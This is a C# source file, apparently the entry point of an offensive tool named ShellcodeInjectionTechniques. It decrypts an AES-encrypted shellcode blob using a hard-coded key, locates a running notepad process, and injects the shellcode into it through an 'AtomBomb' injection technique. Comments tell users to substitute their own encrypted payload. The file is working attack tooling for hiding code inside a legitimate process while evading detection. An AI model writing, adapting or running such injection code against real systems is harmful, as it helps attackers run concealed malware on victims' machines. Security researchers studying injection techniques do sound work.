using System;
using System.Diagnostics;

using static ShellcodeInjectionTechniques.AesHelper;
using static ShellcodeInjectionTechniques.Debugger;

namespace ShellcodeInjectionTechniques
{
    class Program
    {
        static void Main(string[] args)
        {
            // change these to your own encrypted payload and key
            // https://github.com/plackyhacker/ShellcodeEncryptor/blob/master/ProcessInjection.cs
            string payload = "xYvW7Bs7TdHaC9Utat+g35A7T96hSpuK7Vq5Q4rYrJMIh6bZKw+Js++fjoEngxqjzapx6OhJIMp+n/0jCSRdxIbijoRyMCUXJ+mepZ5A/5cY/h5Nz2xQeccXZtbilPkKw0a28bJXYrnI9dusBThx+0Q5oUVotDsgTk/9k3sDkM8aFxOMxLTTHhVg/NQHYE6XOtT3PeAx9R84u2zXi39pBNgn2dwxsp/sdxKdBlbu3yDfH5x0q7pFbyOnNW1a77LrOU9l30+/Gkn8aNP6Bmistqlm1JyVYRqZ3AAm6K0PV5KjnNEdHRqMc9zE3b33vhXcL6BPkDjt0FsilZiprld4Zc/IXPfYeEfcosoVPUaQVRsJ06tX/IB2El0lEGYGVGLVMmjUXjjgO2YMlt9gioZu2UEEKn6VkZ/EnBFMP49VhZ9HELbGECwmhuR/mpbcJmICI81zqulhVYeTaY3TI5jss9/0qRvXHJ0DBRvRTy25Gcs4LGUVE7PTxmPAiuI7dUVpa3GBfRfaIdQhmvIby73hOddN/5YZ7i8zJNJFd6yRgRtNN84OdNAEkIMdM/+pUlYVHogq3gf1j/shrNxYdaftWNqPAAnmH8Qu659LCD1CTh2F9FjdzqQrdbcGfrdxFNKkKQfbtHGDe/W1+BLRBkBzPYFBr2tbC//3+nj6mdX9B2vauJ5CK+wGacaNaPhzMNhMYyrYKMtZjkAoKg4ji7yWz50PK3LiOEH9r1XWLq8fks3zTkkU/dl6aYO1FKoe0P6GPNOCj34FQIZJPeeUkg1b1NXwS4pVhmrDONEfvOVgY0Oe+QljIKRxuxT3P9Gl6IvrEMXD9xqXWmKjBrwUUeWDDdKMsLqTtY/dcaCSaLOO1BcczCXEOGZf7YMGPk10IJj/UmVL4S/ENiVdMtoXf2mPEuupbR0hDCO4LNnoT9QjMjiYNocaSOKKDjNemrfYFf8AfJUpxUxXmUqoLGRB33qGd8R8sUOB3UAhAyWdJJqGKO0+iBOECWDuXPNzOmeSWj5EFpCON5tm61mexAP/Le5ctK8GDAQK0bd53rOyhL+3Jfyh4v33iWXuFZQXUx5Mkb7YXMSYW0n0m/YGucupMhrvag==";
            string key = "yyjGr3HIrLBejCLxQ6pV7UTBI0fPqOGD";

            //payload = "y2QGm0AxSCeX9sfp2CLqBMNE4HMFaxHK9yecr+t5Zix7gRlny8ze4dm2mG0g4DxqNeFOPVjkRWXAWmYHyaszlGC+Y8n0o9l5uUlehtzZ99s1jKLrvkpmWw2JrW9IA0BuohN1MuvEvgS3um+Ou2LJVXapva4t/etAuzoPu9FhOdF7U8hU8D2f+OPCIQiR6FwnZuqb8tY69XzR/m2PHw3s0gsFALYrVHy+RBfdzb9PcMBg4qSOXh3+rNpVkKz24qgkyaQf9tsX1nYpJpoAjxm0vAQ4mgHjaP6V8ZJkPGFaxYX/H9ThE9rqa96byY5Yhx4RWrB4mJeNJ7ndZRz+miQ1DSUGHorPIZAzIdP5jlDI6xvXNO+KUIQOIVsigu0r/7Iqn1Q5Y6HHD4hk92tdBvTUzpkv6Vn5LZ/mEqgqVf/ZaneYgsmxIlKmMebdOwRyWgeElNhQaibmv+zNTEWvhBGHAuaOaIUuKoWGk0X523inrKmzVYLi67uQoW6j+hZk/qeG0qDzpmoDdg+1gAfCgBI1O+CqpulmG8qnxZ0OA1sKl/g8NlRH3MfanOsLt/qYxJZlfDaojeOX9JGv7dStA8Ju0Q3M3fe1PzCYiDM1JIunk97bQM6xZx7dEaQ+01l4V3pHdxccivtGIOGhLNLILf69mAWOjwVyMK4wUWW4Hi6WIESBolxghXx/+bihaNBlr6s/UzrQRd5soYcHfv8TkFIufoURzioE86WdH9fesRlauii7VQxrss7HYlfIVnTryCZRY/pAoX+qMTm7HgQnzpSQkj0WJlKthLNpgS5j33/VpqyzEn3RGL5je788b4ib9cBVkihxff81jGbiw1fmWJE0VsQBwOf+wR1fwDncFAT0fbOt+xQY2y4FoDgMf+0H4YZsICHHQqI8WrHPwXRP/cx5EamFp6x8jdvZgIj3F6pORYmt1fXqnpsVernvsoVkJz6RL5jF2T1LH4Rrl/4eaE9c5Mu+i2l4cDNiJvNYgkwhsh6qA9N0dk8aYgSdxuEyGKHPGgXGJ8Vi4WDl+cf1CROFFA==";
            //key = "4kSuqjJtEJXsBBJoOdaKN7wWpJQk1VHP";

            byte[] shellcode = Decrypt(key, payload);

            // get the process to target
            Process target = null;
            
            Process[] processes = Process.GetProcessesByName("notepad");

            if(processes.Length == 0)
            {
                Debug("[!] Unable to find process to inject into!");
                return;
            }

            Debug("[+] Found process: {0}", new string[] { processes[0].Id.ToString() });
            target = processes[0];
            
                
            // instantiate the chosen technique
            ITechnique teckers = new AtomBomb();
            Debug("[+] Using technique: {0}", new string[] { teckers.GetType().ToString() });

            // send the shellcode to the chosen technique to run
            teckers.Run(target, shellcode);

            // for debugging
#if DEBUG
            Console.ReadLine();
#endif
        }
    }
}
